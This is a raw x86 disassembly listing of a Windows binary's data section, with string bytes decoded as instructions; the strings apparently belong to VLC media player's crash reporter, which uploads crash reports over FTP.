  40d291:	inc    esp
  40d292:	imul   esi,DWORD PTR [edx+0x65],0x726f7463
  40d299:	imul   esp,DWORD PTR [ebp+0x73],0x74655300
  40d2a0:	push   eax
  40d2a1:	jb     0x40d312
  40d2a3:	arpl   WORD PTR [ebp+0x73],sp
  40d2a6:	jae    0x40d2f5
  40d2a8:	imul   esi,DWORD PTR [ecx+ebp*2+0x67],0x6f697461
  40d2b0:	outs   dx,BYTE PTR ds:[esi]
  40d2b1:	push   eax
  40d2b2:	outs   dx,DWORD PTR ds:[esi]
  40d2b3:	ins    BYTE PTR es:[edi],dx
  40d2b4:	imul   esp,DWORD PTR [ebx+0x79],0x2d002d00
  40d2bb:	add    BYTE PTR [ebp+0x0],ch
  40d2be:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  40d2c3:	add    BYTE PTR [ecx+0x0],ah
  40d2c6:	sub    eax,0x69006c00
  40d2cb:	add    BYTE PTR [edx+0x0],ah
  40d2ce:	jb     0x40d2d0
  40d2d0:	popa   
  40d2d1:	add    BYTE PTR [edx+0x0],dh
  40d2d4:	jns    0x40d2d6
  40d2d6:	add    BYTE PTR [eax],al
  40d2d8:	sub    eax,0x6e002d00
  40d2dd:	add    BYTE PTR [edi+0x0],ch
  40d2e0:	sub    eax,0x67006900
  40d2e5:	add    BYTE PTR [esi+0x0],ch
  40d2e8:	outs   dx,DWORD PTR ds:[esi]
  40d2e9:	add    BYTE PTR [edx+0x0],dh
  40d2ec:	add    BYTE PTR gs:0x6f006300,ch
  40d2f3:	add    BYTE PTR [esi+0x0],ch
  40d2f6:	data16 add BYTE PTR [ecx+0x0],ch
  40d2fa:	add    BYTE PTR [bx+si],al
  40d2fd:	add    BYTE PTR ds:0x6e002d00,ch
  40d303:	add    BYTE PTR [edi+0x0],ch
  40d306:	sub    eax,0x72006300
  40d30b:	add    BYTE PTR [ecx+0x0],ah
  40d30e:	jae    0x40d310
  40d310:	push   0x75006400
  40d315:	add    BYTE PTR [ebp+0x0],ch
  40d318:	jo     0x40d31a
  40d31a:	add    BYTE PTR [eax],al
  40d31c:	sub    eax,0x6c002d00
  40d321:	add    BYTE PTR [ecx+0x0],ah
  40d324:	outs   dx,BYTE PTR ds:[esi]
  40d325:	add    BYTE PTR [edi+0x0],ah
  40d328:	jne    0x40d32a
  40d32a:	popa   
  40d32b:	add    BYTE PTR [edi+0x0],ah
  40d32e:	add    BYTE PTR gs:[eax],al
  40d331:	add    BYTE PTR ds:0x2d00,ch
  40d337:	add    BYTE PTR [ebx+0x61],al
  40d33a:	outs   dx,BYTE PTR ds:[esi]
  40d33b:	daa    
  40d33c:	je     0x40d35e
  40d33e:	outs   dx,DWORD PTR ds:[esi]
  40d33f:	jo     0x40d3a6
  40d341:	outs   dx,BYTE PTR ds:[esi]
  40d342:	and    BYTE PTR [eax+ebp*2+0x65],dh
  40d346:	and    BYTE PTR [esi+0x6c],dh
  40d349:	arpl   WORD PTR [eax],sp
  40d34b:	arpl   WORD PTR [edi+0x6e],bp
  40d34e:	data16 and BYTE PTR [eax+0x41],dl
  40d352:	push   esp
  40d353:	dec    eax
  40d354:	or     al,BYTE PTR [eax]
  40d356:	pop    esp
  40d357:	add    BYTE PTR [esi+0x0],dh
  40d35a:	ins    BYTE PTR es:[edi],dx
  40d35b:	add    BYTE PTR [ebx+0x0],ah
  40d35e:	pop    esp
  40d35f:	add    BYTE PTR [ebx+0x0],ah
  40d362:	jb     0x40d364
  40d364:	popa   
  40d365:	add    BYTE PTR [ebx+0x0],dh
  40d368:	push   0x75006400
  40d36d:	add    BYTE PTR [ebp+0x0],ch
  40d370:	jo     0x40d372
  40d372:	add    BYTE PTR [eax],al
  40d374:	and    eax,0x7300
  40d379:	add    BYTE PTR [esi],ch
  40d37b:	add    BYTE PTR [ebp+0x0],ch
  40d37e:	jbe    0x40d380
  40d380:	add    BYTE PTR [eax],al
  40d382:	jb     0x40d384
  40d384:	sub    al,0x0
  40d386:	and    BYTE PTR [eax],al
  40d388:	arpl   WORD PTR [eax],ax
  40d38a:	arpl   WORD PTR [eax],ax
  40d38c:	jae    0x40d38e
  40d38e:	cmp    eax,0x54005500
  40d393:	add    BYTE PTR [esi+0x0],al
  40d396:	sub    eax,0x3800
  40d39b:	add    BYTE PTR [esi+0x0],dl
  40d39e:	dec    esp
  40d39f:	add    BYTE PTR [ebx+0x0],al
  40d3a2:	and    BYTE PTR [eax],al
  40d3a4:	arpl   WORD PTR [eax],ax
  40d3a6:	jb     0x40d3a8
  40d3a8:	popa   
  40d3a9:	add    BYTE PTR [ebx+0x0],dh
  40d3ac:	push   0x72002000
  40d3b1:	add    BYTE PTR [ebp+0x0],ah
  40d3b4:	jo     0x40d3b6
  40d3b6:	outs   dx,DWORD PTR ds:[esi]
  40d3b7:	add    BYTE PTR [edx+0x0],dh
  40d3ba:	je     0x40d3bc
  40d3bc:	imul   eax,DWORD PTR [eax],0x67006e
  40d3c2:	add    BYTE PTR [eax],al
  40d3c4:	dec    edi
  40d3c5:	add    BYTE PTR [edi+0x0],ch
  40d3c8:	outs   dx,DWORD PTR ds:[esi]
  40d3c9:	add    BYTE PTR [eax+0x0],dh
  40d3cc:	jae    0x40d3ce
  40d3ce:	cmp    al,BYTE PTR [eax]
  40d3d0:	and    BYTE PTR [eax],al
  40d3d2:	push   esi
  40d3d3:	add    BYTE PTR [eax+eax*1+0x43],cl
  40d3d7:	add    BYTE PTR [eax],ah
  40d3d9:	add    BYTE PTR [ebp+0x0],ch
  40d3dc:	add    BYTE PTR gs:[eax+eax*1+0x69],ah
  40d3e1:	add    BYTE PTR [ecx+0x0],ah
  40d3e4:	and    BYTE PTR [eax],al
  40d3e6:	jo     0x40d3e8
  40d3e8:	ins    BYTE PTR es:[edi],dx
  40d3e9:	add    BYTE PTR [ecx+0x0],ah
  40d3ec:	jns    0x40d3ee
  40d3ee:	add    BYTE PTR gs:[edx+0x0],dh
  40d3f2:	and    BYTE PTR [eax],al
  40d3f4:	push   0x0
  40d3f6:	jne    0x40d3f8
  40d3f8:	jae    0x40d3fa
  40d3fa:	je     0x40d3fc
  40d3fc:	and    BYTE PTR [eax],al
  40d3fe:	arpl   WORD PTR [eax],ax
  40d400:	jb     0x40d402
  40d402:	popa   
  40d403:	add    BYTE PTR [ebx+0x0],dh
  40d406:	push   0x64006500
  40d40b:	add    BYTE PTR [esi],ch
  40d40d:	add    BYTE PTR [edx],cl
  40d40f:	add    BYTE PTR [edi+0x0],dl
  40d412:	outs   dx,DWORD PTR ds:[esi]
  40d413:	add    BYTE PTR [ebp+0x0],dh
  40d416:	ins    BYTE PTR es:[edi],dx
  40d417:	add    BYTE PTR [eax+eax*1+0x20],ah
  40d41b:	add    BYTE PTR [ecx+0x0],bh
  40d41e:	outs   dx,DWORD PTR ds:[esi]
  40d41f:	add    BYTE PTR [ebp+0x0],dh
  40d422:	and    BYTE PTR [eax],al
  40d424:	ins    BYTE PTR es:[edi],dx
  40d425:	add    BYTE PTR [ecx+0x0],ch
  40d428:	imul   eax,DWORD PTR [eax],0x65
  40d42b:	add    BYTE PTR [eax],ah
  40d42d:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40d431:	add    BYTE PTR [eax],ah
  40d433:	add    BYTE PTR [ebx+0x0],dh
  40d436:	add    BYTE PTR gs:[esi+0x0],ch
  40d43a:	add    BYTE PTR fs:[eax],ah
  40d43d:	add    BYTE PTR [ecx+0x0],ah
  40d440:	and    BYTE PTR [eax],al
  40d442:	bound  eax,QWORD PTR [eax]
  40d444:	jne    0x40d446
  40d446:	add    BYTE PTR [bx+si],ah
  40d449:	add    BYTE PTR [edx+0x0],dh
  40d44c:	add    BYTE PTR gs:[eax+0x0],dh
  40d450:	outs   dx,DWORD PTR ds:[esi]
  40d451:	add    BYTE PTR [edx+0x0],dh
  40d454:	je     0x40d456
  40d456:	and    BYTE PTR [eax],al
  40d458:	je     0x40d45a
  40d45a:	outs   dx,DWORD PTR ds:[esi]
  40d45b:	add    BYTE PTR [eax],ah
  40d45d:	add    BYTE PTR [eax+eax*1+0x68],dh
  40d461:	add    BYTE PTR [ebp+0x0],ah
  40d464:	and    BYTE PTR [eax],al
  40d466:	add    BYTE PTR fs:[ebp+0x0],ah
  40d46a:	jbe    0x40d46c
  40d46c:	add    BYTE PTR gs:[eax+eax*1+0x6f],ch
  40d471:	add    BYTE PTR [eax+0x0],dh
  40d474:	add    BYTE PTR gs:[edx+0x0],dh
  40d478:	jae    0x40d47a
  40d47a:	and    BYTE PTR [eax],al
  40d47c:	je     0x40d47e
  40d47e:	add    BYTE PTR gs:[ecx+0x0],ah
  40d482:	ins    DWORD PTR es:[edi],dx
  40d483:	add    BYTE PTR [edi],bh
  40d485:	add    BYTE PTR [eax],al
  40d487:	add    BYTE PTR [edi+0x0],dh
  40d48a:	imul   eax,DWORD PTR [eax],0x69006e
  40d490:	outs   dx,BYTE PTR ds:[esi]
  40d491:	add    BYTE PTR [ebp+0x0],ah
  40d494:	je     0x40d496
  40d496:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  40d49b:	add    BYTE PTR [eax+eax*1+0x0],ch
  40d49f:	add    BYTE PTR [eax+ebp*2+0x65],dl
  40d4a3:	jb     0x40d50a
  40d4a5:	and    BYTE PTR [edi+0x61],dh
  40d4a8:	jae    0x40d4ca
  40d4aa:	popa   
  40d4ab:	outs   dx,BYTE PTR ds:[esi]
  40d4ac:	and    BYTE PTR [ebp+0x72],ah
  40d4af:	jb     0x40d520
  40d4b1:	jb     0x40d4d3
  40d4b3:	ins    BYTE PTR es:[edi],dx
  40d4b4:	outs   dx,DWORD PTR ds:[esi]
  40d4b5:	popa   
  40d4b6:	imul   ebp,DWORD PTR fs:[esi+0x67],0x65687420
  40d4be:	and    BYTE PTR [esi+0x65],ch
  40d4c1:	je     0x40d53a
  40d4c3:	outs   dx,DWORD PTR ds:[esi]
  40d4c4:	jb     0x40d531
  40d4c6:	and    BYTE PTR [eax],dh
  40d4c8:	js     0x40d4ef
  40d4ca:	xor    BYTE PTR [eax],bh
  40d4cc:	ins    BYTE PTR es:[edi],dx
  40d4cd:	js     0x40d4d9
  40d4cf:	add    BYTE PTR [ecx+0x6e],cl
  40d4d2:	je     0x40d539
  40d4d4:	jb     0x40d544
  40d4d6:	gs je  0x40d528
  40d4d9:	jo     0x40d540
  40d4db:	outs   dx,BYTE PTR ds:[esi]
  40d4dc:	push   edi
  40d4dd:	add    BYTE PTR [ecx+0x6e],cl
  40d4e0:	je     0x40d547
  40d4e2:	jb     0x40d552
  40d4e4:	gs je  0x40d52a
  40d4e7:	outs   dx,DWORD PTR ds:[esi]
  40d4e8:	outs   dx,BYTE PTR ds:[esi]
  40d4e9:	outs   dx,BYTE PTR ds:[esi]
  40d4ea:	arpl   WORD PTR gs:[edi+edx*2+0x0],si
  40d4ef:	dec    ecx
  40d4f0:	outs   dx,BYTE PTR ds:[esi]
  40d4f1:	je     0x40d558
  40d4f3:	jb     0x40d563
  40d4f5:	gs je  0x40d53b
  40d4f8:	ins    BYTE PTR es:[edi],dx
  40d4f9:	outs   dx,DWORD PTR ds:[esi]
  40d4fa:	jae    0x40d561
  40d4fc:	dec    eax
  40d4fd:	popa   
  40d4fe:	outs   dx,BYTE PTR ds:[esi]
  40d4ff:	fs ins BYTE PTR es:[edi],dx
  40d501:	add    BYTE PTR gs:[esi+0x74],al
  40d505:	jo     0x40d557
  40d507:	jne    0x40d57d
  40d509:	inc    esi
  40d50a:	imul   ebp,DWORD PTR [ebp+eiz*2+0x57],0x68540000
  40d512:	gs jb  0x40d57a
  40d515:	and    BYTE PTR [edi+0x61],dh
  40d518:	jae    0x40d53a
  40d51a:	popa   
  40d51b:	outs   dx,BYTE PTR ds:[esi]
  40d51c:	and    BYTE PTR [ebp+0x72],ah
  40d51f:	jb     0x40d590
  40d521:	jb     0x40d543
  40d523:	ins    BYTE PTR es:[edi],dx
  40d524:	outs   dx,DWORD PTR ds:[esi]
  40d525:	popa   
  40d526:	imul   ebp,DWORD PTR fs:[esi+0x67],0x65687420
  40d52e:	and    BYTE PTR [esi+0x65],ch
  40d531:	je     0x40d5aa
  40d533:	outs   dx,DWORD PTR ds:[esi]
  40d534:	jb     0x40d5a1
  40d536:	and    BYTE PTR [ecx+0x50],al
  40d539:	dec    ecx
  40d53a:	and    BYTE PTR [ebp+0x6e],ah
  40d53d:	je     0x40d5b1
  40d53f:	imul   esp,DWORD PTR [ebp+0x73],0x25783020
  40d546:	xor    BYTE PTR [eax],bh
  40d548:	ins    BYTE PTR es:[edi],dx
  40d549:	js     0x40d555
  40d54b:	add    BYTE PTR [esi+0x0],dl
  40d54e:	dec    esp
  40d54f:	add    BYTE PTR [ebx+0x0],al
  40d552:	and    BYTE PTR [eax],al
  40d554:	inc    ebx
  40d555:	add    BYTE PTR [edx+0x0],dh
  40d558:	popa   
  40d559:	add    BYTE PTR [ebx+0x0],dh
  40d55c:	push   0x52002000
  40d561:	add    BYTE PTR [ebp+0x0],ah
  40d564:	jo     0x40d566
  40d566:	outs   dx,DWORD PTR ds:[esi]
  40d567:	add    BYTE PTR [edx+0x0],dh
  40d56a:	je     0x40d56c
  40d56c:	add    BYTE PTR gs:[edx+0x0],dh
  40d570:	add    BYTE PTR [eax],al
  40d572:	add    BYTE PTR [eax],al
  40d574:	arpl   WORD PTR [eax],ax
  40d576:	jb     0x40d578
  40d578:	popa   
  40d579:	add    BYTE PTR [ebx+0x0],dh
  40d57c:	push   0x76002e00
  40d581:	add    BYTE PTR [ecx+0x0],ch
  40d584:	add    BYTE PTR fs:[ebp+0x0],ah
  40d588:	outs   dx,DWORD PTR ds:[esi]
  40d589:	add    BYTE PTR [eax+eax*1+0x61],ch
  40d58d:	add    BYTE PTR [esi+0x0],ch
  40d590:	add    BYTE PTR cs:[edi+0x0],ch
  40d594:	jb     0x40d596
  40d596:	add    BYTE PTR [bx+si],al
  40d599:	add    BYTE PTR [eax],al
  40d59b:	add    BYTE PTR [edi],ch
  40d59d:	add    BYTE PTR [ebx+0x0],ah
  40d5a0:	jb     0x40d5a2
  40d5a2:	popa   
  40d5a3:	add    BYTE PTR [ebx+0x0],dh
  40d5a6:	push   0x73006500
  40d5ab:	add    BYTE PTR ds:0x69007700,ch
  40d5b1:	add    BYTE PTR [esi+0x0],ch
  40d5b4:	xor    eax,DWORD PTR [eax]
  40d5b6:	xor    al,BYTE PTR [eax]
  40d5b8:	das    
  40d5b9:	add    BYTE PTR ds:0x34003000,ah
  40d5bf:	add    BYTE PTR [eax+eax*1+0x25],ah
  40d5c3:	add    BYTE PTR [eax],dh
  40d5c5:	add    BYTE PTR [edx],dh
  40d5c7:	add    BYTE PTR [eax+eax*1+0x25],ah
  40d5cb:	add    BYTE PTR [eax],dh
  40d5cd:	add    BYTE PTR [edx],dh
  40d5cf:	add    BYTE PTR [eax+eax*1+0x25],ah
  40d5d3:	add    BYTE PTR [eax],dh
  40d5d5:	add    BYTE PTR [edx],dh
  40d5d7:	add    BYTE PTR [eax+eax*1+0x25],ah
  40d5db:	add    BYTE PTR [eax],dh
  40d5dd:	add    BYTE PTR [edx],dh
  40d5df:	add    BYTE PTR [eax+eax*1+0x25],ah
  40d5e3:	add    BYTE PTR [eax],dh
  40d5e5:	add    BYTE PTR [edx],dh
  40d5e7:	add    BYTE PTR [eax+eax*1+0x0],ah
  40d5eb:	add    BYTE PTR [edx+0x65],dl
  40d5ee:	jo     0x40d65f
  40d5f0:	jb     0x40d666
  40d5f2:	and    BYTE PTR [ebx+0x65],dh
  40d5f5:	outs   dx,BYTE PTR ds:[esi]
  40d5f6:	je     0x40d618
  40d5f8:	arpl   WORD PTR [edi+0x72],bp
  40d5fb:	jb     0x40d662
  40d5fd:	arpl   WORD PTR [esp+ebp*2+0x79],si
  40d601:	and    BYTE PTR [edi+ebp*2+0x20],dh
  40d605:	inc    esi
  40d606:	push   esp
  40d607:	push   eax
  40d608:	or     al,BYTE PTR cs:[eax]
  40d60b:	add    BYTE PTR [edx+0x0],dl
  40d60e:	add    BYTE PTR gs:[eax+0x0],dh
  40d612:	outs   dx,DWORD PTR ds:[esi]
  40d613:	add    BYTE PTR [edx+0x0],dh
  40d616:	je     0x40d618
  40d618:	and    BYTE PTR [eax],al
  40d61a:	jae    0x40d61c
  40d61c:	add    BYTE PTR gs:[esi+0x0],ch
  40d620:	add    BYTE PTR fs:[ecx+0x0],ch
  40d624:	outs   dx,BYTE PTR ds:[esi]
  40d625:	add    BYTE PTR [edi+0x0],ah
  40d628:	and    BYTE PTR [eax],al
  40d62a:	data16 add BYTE PTR [ecx+0x0],ah
  40d62e:	imul   eax,DWORD PTR [eax],0x65006c
  40d634:	add    BYTE PTR fs:[eax],al
  40d637:	add    BYTE PTR [eax+eax*1+0x68],dl
  40d63b:	add    BYTE PTR [ebp+0x0],ah
  40d63e:	jb     0x40d640
  40d640:	add    BYTE PTR gs:[eax],ah
  40d643:	add    BYTE PTR [edi+0x0],dh
  40d646:	popa   
  40d647:	add    BYTE PTR [ebx+0x0],dh
  40d64a:	and    BYTE PTR [eax],al
  40d64c:	popa   
  40d64d:	add    BYTE PTR [esi+0x0],ch
  40d650:	and    BYTE PTR [eax],al
  40d652:	add    BYTE PTR gs:[edx+0x0],dh
  40d656:	jb     0x40d658
  40d658:	outs   dx,DWORD PTR ds:[esi]
  40d659:	add    BYTE PTR [edx+0x0],dh
  40d65c:	and    BYTE PTR [eax],al
  40d65e:	ja     0x40d660
  40d660:	push   0x6c006900
  40d665:	add    BYTE PTR [ebp+0x0],ah
  40d668:	and    BYTE PTR [eax],al
  40d66a:	je     0x40d66c
  40d66c:	jb     0x40d66e
  40d66e:	popa   
  40d66f:	add    BYTE PTR [esi+0x0],ch
  40d672:	jae    0x40d674
  40d674:	data16 add BYTE PTR [ebp+0x0],ah
  40d678:	jb     0x40d67a
  40d67a:	jb     0x40d67c
  40d67c:	imul   eax,DWORD PTR [eax],0x67006e
  40d682:	and    BYTE PTR [eax],al
  40d684:	je     0x40d686
  40d686:	push   0x20006500
  40d68b:	add    BYTE PTR [eax+eax*1+0x61],ah
  40d68f:	add    BYTE PTR [eax+eax*1+0x61],dh
  40d693:	add    BYTE PTR [eax],ah
  40d695:	add    BYTE PTR [eax+eax*1+0x6f],dh
  40d699:	add    BYTE PTR [eax],ah
  40d69b:	add    BYTE PTR [eax+eax*1+0x68],dh
  40d69f:	add    BYTE PTR [ebp+0x0],ah
  40d6a2:	and    BYTE PTR [eax],al
  40d6a4:	inc    esi
  40d6a5:	add    BYTE PTR [eax+eax*1+0x50],dl
  40d6a9:	add    BYTE PTR [eax],ah
  40d6ab:	add    BYTE PTR [ebx+0x0],dh
  40d6ae:	add    BYTE PTR gs:[edx+0x0],dh
  40d6b2:	jbe    0x40d6b4
  40d6b4:	add    BYTE PTR gs:[edx+0x0],dh
  40d6b8:	add    BYTE PTR cs:[edx],cl
  40d6bb:	add    BYTE PTR [eax+eax*1+0x68],dl
  40d6bf:	add    BYTE PTR [ecx+0x0],ah
  40d6c2:	outs   dx,BYTE PTR ds:[esi]
  40d6c3:	add    BYTE PTR [ebx+0x0],ch
  40d6c6:	jae    0x40d6c8
  40d6c8:	and    BYTE PTR [eax],al
  40d6ca:	popa   
  40d6cb:	add    BYTE PTR [eax],ah
  40d6cd:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40d6d1:	add    BYTE PTR [eax+eax*1+0x20],dh
  40d6d5:	add    BYTE PTR [esi+0x0],ah
  40d6d8:	outs   dx,DWORD PTR ds:[esi]
  40d6d9:	add    BYTE PTR [edx+0x0],dh
  40d6dc:	and    BYTE PTR [eax],al
  40d6de:	je     0x40d6e0
  40d6e0:	push   0x20006500
  40d6e5:	add    BYTE PTR [eax+0x0],ch
  40d6e8:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40d6ed:	add    BYTE PTR [esi],ch
  40d6ef:	add    BYTE PTR [eax],al
  40d6f1:	add    BYTE PTR [eax],al
  40d6f3:	add    BYTE PTR [eax+eax*1+0x68],dl
  40d6f7:	add    BYTE PTR [ebp+0x0],ah
  40d6fa:	jb     0x40d6fc
  40d6fc:	add    BYTE PTR gs:[eax],ah
  40d6ff:	add    BYTE PTR [edi+0x0],dh
  40d702:	popa   
  40d703:	add    BYTE PTR [ebx+0x0],dh
  40d706:	and    BYTE PTR [eax],al
  40d708:	popa   
  40d709:	add    BYTE PTR [esi+0x0],ch
  40d70c:	and    BYTE PTR [eax],al
  40d70e:	add    BYTE PTR gs:[edx+0x0],dh
  40d712:	jb     0x40d714
  40d714:	outs   dx,DWORD PTR ds:[esi]
  40d715:	add    BYTE PTR [edx+0x0],dh
  40d718:	and    BYTE PTR [eax],al
  40d71a:	ja     0x40d71c
  40d71c:	push   0x6c006900
  40d721:	add    BYTE PTR [ebp+0x0],ah
  40d724:	and    BYTE PTR [eax],al
  40d726:	arpl   WORD PTR [eax],ax
  40d728:	outs   dx,DWORD PTR ds:[esi]
  40d729:	add    BYTE PTR [esi+0x0],ch
  40d72c:	outs   dx,BYTE PTR ds:[esi]
  40d72d:	add    BYTE PTR [ebp+0x0],ah
  40d730:	arpl   WORD PTR [eax],ax
  40d732:	je     0x40d734
  40d734:	imul   eax,DWORD PTR [eax],0x67006e
  40d73a:	and    BYTE PTR [eax],al
  40d73c:	je     0x40d73e
  40d73e:	outs   dx,DWORD PTR ds:[esi]
  40d73f:	add    BYTE PTR [eax],ah
  40d741:	add    BYTE PTR [eax+eax*1+0x68],dh
  40d745:	add    BYTE PTR [ebp+0x0],ah
  40d748:	and    BYTE PTR [eax],al
  40d74a:	inc    esi
  40d74b:	add    BYTE PTR [eax+eax*1+0x50],dl
  40d74f:	add    BYTE PTR [eax],ah
  40d751:	add    BYTE PTR [ebx+0x0],dh
  40d754:	add    BYTE PTR gs:[edx+0x0],dh
  40d758:	jbe    0x40d75a
  40d75a:	add    BYTE PTR gs:[edx+0x0],dh
  40d75e:	add    BYTE PTR cs:[eax],ah
  40d761:	add    BYTE PTR [eax+eax*1+0x68],dl
  40d765:	add    BYTE PTR [ecx+0x0],ah
  40d768:	outs   dx,BYTE PTR ds:[esi]
  40d769:	add    BYTE PTR [ebx+0x0],ch
  40d76c:	jae    0x40d76e
  40d76e:	and    BYTE PTR [eax],al
  40d770:	popa   
  40d771:	add    BYTE PTR [eax],ah
  40d773:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40d777:	add    BYTE PTR [eax+eax*1+0x20],dh
  40d77b:	add    BYTE PTR [esi+0x0],ah
  40d77e:	outs   dx,DWORD PTR ds:[esi]
  40d77f:	add    BYTE PTR [edx+0x0],dh
  40d782:	and    BYTE PTR [eax],al
  40d784:	je     0x40d786
  40d786:	push   0x20006500
  40d78b:	add    BYTE PTR [eax+0x0],ch
  40d78e:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40d793:	add    BYTE PTR [esi],ch
  40d795:	add    BYTE PTR [eax],al
  40d797:	add    BYTE PTR [ebx+0x61],al
  40d79a:	outs   dx,BYTE PTR ds:[esi]
  40d79b:	daa    
  40d79c:	je     0x40d7be
  40d79e:	arpl   WORD PTR [edi+0x6e],bp
  40d7a1:	outs   dx,BYTE PTR ds:[esi]
  40d7a2:	arpl   WORD PTR gs:[eax+eiz*1+0x74],si
  40d7a7:	outs   dx,DWORD PTR ds:[esi]
  40d7a8:	and    BYTE PTR [esi+0x54],al
  40d7ab:	push   eax
  40d7ac:	and    BYTE PTR [ebx+0x65],dh
  40d7af:	jb     0x40d827
  40d7b1:	gs jb  0x40d7d4
  40d7b4:	xor    BYTE PTR [eax+0x25],bh
  40d7b7:	xor    BYTE PTR [eax],bh
  40d7b9:	ins    BYTE PTR es:[edi],dx
  40d7ba:	jne    0x40d7c6
  40d7bc:	add    BYTE PTR [eax],al
  40d7be:	add    BYTE PTR [eax],al
  40d7c0:	push   esp
  40d7c1:	add    BYTE PTR [eax+0x0],ch
  40d7c4:	add    BYTE PTR gs:[edx+0x0],dh
  40d7c8:	add    BYTE PTR gs:[eax],ah
  40d7cb:	add    BYTE PTR [edi+0x0],dh
  40d7ce:	popa   
  40d7cf:	add    BYTE PTR [ebx+0x0],dh
  40d7d2:	and    BYTE PTR [eax],al
  40d7d4:	popa   
  40d7d5:	add    BYTE PTR [esi+0x0],ch
  40d7d8:	and    BYTE PTR [eax],al
  40d7da:	add    BYTE PTR gs:[edx+0x0],dh
  40d7de:	jb     0x40d7e0
  40d7e0:	outs   dx,DWORD PTR ds:[esi]
  40d7e1:	add    BYTE PTR [edx+0x0],dh
  40d7e4:	and    BYTE PTR [eax],al
  40d7e6:	ja     0x40d7e8
  40d7e8:	push   0x6c006900
  40d7ed:	add    BYTE PTR [ebp+0x0],ah
  40d7f0:	and    BYTE PTR [eax],al
  40d7f2:	arpl   WORD PTR [eax],ax
  40d7f4:	outs   dx,DWORD PTR ds:[esi]
  40d7f5:	add    BYTE PTR [esi+0x0],ch
  40d7f8:	outs   dx,BYTE PTR ds:[esi]
  40d7f9:	add    BYTE PTR [ebp+0x0],ah
  40d7fc:	arpl   WORD PTR [eax],ax
  40d7fe:	je     0x40d800
  40d800:	imul   eax,DWORD PTR [eax],0x67006e
  40d806:	and    BYTE PTR [eax],al
  40d808:	je     0x40d80a
  40d80a:	outs   dx,DWORD PTR ds:[esi]
  40d80b:	add    BYTE PTR [eax],ah
  40d80d:	add    BYTE PTR [eax+eax*1+0x68],dh
  40d811:	add    BYTE PTR [ebp+0x0],ah
  40d814:	and    BYTE PTR [eax],al
  40d816:	dec    ecx
  40d817:	add    BYTE PTR [esi+0x0],ch
  40d81a:	je     0x40d81c
  40d81c:	add    BYTE PTR gs:[edx+0x0],dh
  40d820:	outs   dx,BYTE PTR ds:[esi]
  40d821:	add    BYTE PTR [ebp+0x0],ah
  40d824:	je     0x40d826
  40d826:	add    BYTE PTR cs:[edx],cl
  40d829:	add    BYTE PTR [eax+eax*1+0x68],dl
  40d82d:	add    BYTE PTR [ecx+0x0],ah
  40d830:	outs   dx,BYTE PTR ds:[esi]
  40d831:	add    BYTE PTR [ebx+0x0],ch
  40d834:	jae    0x40d836
  40d836:	and    BYTE PTR [eax],al
  40d838:	popa   
  40d839:	add    BYTE PTR [eax],ah
  40d83b:	add    BYTE PTR [eax+eax*1+0x6f],ch
  40d83f:	add    BYTE PTR [eax+eax*1+0x20],dh
  40d843:	add    BYTE PTR [esi+0x0],ah
  40d846:	outs   dx,DWORD PTR ds:[esi]
  40d847:	add    BYTE PTR [edx+0x0],dh
  40d84a:	and    BYTE PTR [eax],al
  40d84c:	je     0x40d84e
  40d84e:	push   0x20006500
  40d853:	add    BYTE PTR [eax+0x0],ch
  40d856:	add    BYTE PTR gs:[eax+eax*1+0x70],ch
  40d85b:	add    BYTE PTR [eax],ah
  40d85d:	add    BYTE PTR [ecx+0x0],ah
  40d860:	outs   dx,BYTE PTR ds:[esi]
  40d861:	add    BYTE PTR [ecx+0x0],bh
  40d864:	ja     0x40d866
  40d866:	popa   
  40d867:	add    BYTE PTR [ecx+0x0],bh
  40d86a:	add    BYTE PTR cs:[eax],al
  40d86d:	add    BYTE PTR [eax],al
  40d86f:	add    BYTE PTR [esi+0x0],dl
  40d872:	dec    esp
  40d873:	add    BYTE PTR [ebx+0x0],al
  40d876:	and    BYTE PTR [eax],al
  40d878:	arpl   WORD PTR [eax],ax
  40d87a:	jb     0x40d87c
  40d87c:	popa   
  40d87d:	add    BYTE PTR [ebx+0x0],dh
  40d880:	push   0x72002000
  40d885:	add    BYTE PTR [ebp+0x0],ah
  40d888:	jo     0x40d88a
  40d88a:	outs   dx,DWORD PTR ds:[esi]
  40d88b:	add    BYTE PTR [edx+0x0],dh
  40d88e:	je     0x40d890
  40d890:	add    BYTE PTR [eax],al
  40d892:	add    BYTE PTR [eax],al
  40d894:	push   esp
  40d895:	add    BYTE PTR [eax+0x0],ch
  40d898:	popa   
  40d899:	add    BYTE PTR [esi+0x0],ch
  40d89c:	imul   eax,DWORD PTR [eax],0x73
  40d89f:	add    BYTE PTR [eax],ah
  40d8a1:	add    BYTE PTR [ecx+0x0],ah
  40d8a4:	and    BYTE PTR [eax],al
  40d8a6:	ins    BYTE PTR es:[edi],dx
  40d8a7:	add    BYTE PTR [edi+0x0],ch
  40d8aa:	je     0x40d8ac
  40d8ac:	and    BYTE PTR [eax],al
  40d8ae:	data16 add BYTE PTR [edi+0x0],ch
  40d8b2:	jb     0x40d8b4
  40d8b4:	and    BYTE PTR [eax],al
  40d8b6:	push   0x6c006500
  40d8bb:	add    BYTE PTR [eax+0x0],dh
  40d8be:	imul   eax,DWORD PTR [eax],0x67006e
  40d8c4:	and    BYTE PTR [eax],al
  40d8c6:	imul   eax,DWORD PTR [eax],0x70006d
  40d8cc:	jb     0x40d8ce
  40d8ce:	outs   dx,DWORD PTR ds:[esi]
  40d8cf:	add    BYTE PTR [esi+0x0],dh
  40d8d2:	imul   eax,DWORD PTR [eax],0x67006e
  40d8d8:	and    BYTE PTR [eax],al
  40d8da:	push   esi
  40d8db:	add    BYTE PTR [eax+eax*1+0x43],cl
  40d8df:	add    BYTE PTR [ecx],ah
  40d8e1:	add    BYTE PTR [eax],al
  40d8e3:	add    BYTE PTR [ebx+0x0],dl
  40d8e6:	outs   dx,DWORD PTR ds:[esi]
  40d8e7:	add    BYTE PTR [esi+0x0],ah
  40d8ea:	je     0x40d8ec
  40d8ec:	ja     0x40d8ee
  40d8ee:	popa   
  40d8ef:	add    BYTE PTR [edx+0x0],dh
  40d8f2:	add    BYTE PTR gs:[eax+eax*1+0x56],bl
  40d8f7:	add    BYTE PTR [ecx+0x0],ch
  40d8fa:	add    BYTE PTR fs:[ebp+0x0],ah
